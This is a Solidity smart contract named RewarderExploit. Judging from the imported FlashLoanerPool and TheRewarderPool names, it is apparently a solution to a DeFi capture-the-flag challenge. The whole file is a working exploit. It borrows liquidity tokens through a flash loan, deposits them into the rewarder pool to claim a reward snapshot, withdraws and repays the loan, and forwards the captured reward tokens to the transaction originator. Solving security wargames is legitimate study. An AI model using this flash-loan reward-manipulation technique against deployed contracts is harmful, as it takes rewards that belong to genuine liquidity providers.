// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";

/**
 * @title RewarderExploit
 * @author scorpion9979
 */
contract RewarderExploit {
    FlashLoanerPool public immutable flashLoanPool;
    TheRewarderPool public immutable rewarderPool;
    address public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(
        FlashLoanerPool flashLoanPool_,
        TheRewarderPool rewarderPool_,
        address liquidityToken_,
        RewardToken rewardToken_
    ) {
        flashLoanPool = flashLoanPool_;
        rewarderPool = rewarderPool_;
        liquidityToken = liquidityToken_;
        rewardToken = rewardToken_;
    }

    function receiveFlashLoan(uint256 amount) external payable {
        // Approve rewarderPool to spend flash loaned liquidityToken
        SafeTransferLib.safeApprove(
            liquidityToken,
            address(rewarderPool),
            amount
        );
        // Deposit liquidityToken to get rewards
        rewarderPool.deposit(amount);
        // Withdraw liquidityToken to repay the flash loan
        rewarderPool.withdraw(amount);
        // Repay the flash loan
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
        // Transfer rewards to exploiter
        SafeTransferLib.safeTransfer(
            address(rewardToken),
            tx.origin,
            rewardToken.balanceOf(address(this))
        );
    }

    function exploit(uint256 amount) external payable {
        flashLoanPool.flashLoan(amount);
    }
}
